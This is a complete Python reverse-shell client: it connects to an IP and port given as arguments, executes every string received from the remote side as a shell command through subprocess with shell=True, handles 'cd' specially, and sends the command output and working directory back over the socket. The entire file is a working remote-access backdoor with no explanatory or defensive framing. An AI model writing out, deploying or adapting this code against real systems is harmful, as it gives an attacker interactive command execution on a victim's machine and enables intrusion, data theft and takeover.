#!/usr/bin/env python
import signal
import sys
import os
import socket
import subprocess

def sig_quit(signal=None, frame=None):
    print('\nQuitting...')
    if sock:
        try:
            sock.shutdown(2)
            sock.close()
        except Exception as e:
            print('Could not close connection %s' % str(e))
    sys.exit(0)
    return

signal.signal(signal.SIGINT, sig_quit)
signal.signal(signal.SIGTERM, sig_quit)

if len(sys.argv) < 3:
    print("Usage: ./client.py <IP> <port>")
    exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
sock = socket.socket()
sock.connect((host, port))


while True:
    data = sock.recv(4096)
    out_str = None
    if data == b'': break
    elif data[:2].decode("utf-8") == 'cd':
        dir = data[3:].decode("utf-8")
        try:
            os.chdir(dir.strip())
        except Exception as e:
            out_str = "Could not change directory: %s\n" %str(e)
        else:
            out_str = ""
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out_bytes = cmd.stdout.read() + cmd.stderr.read()
        out_str = str(out_bytes, "utf-8")
        sock.send(str.encode(out_str + str(os.getcwd()) + " > "))
        #print(out_str)

sock.close()
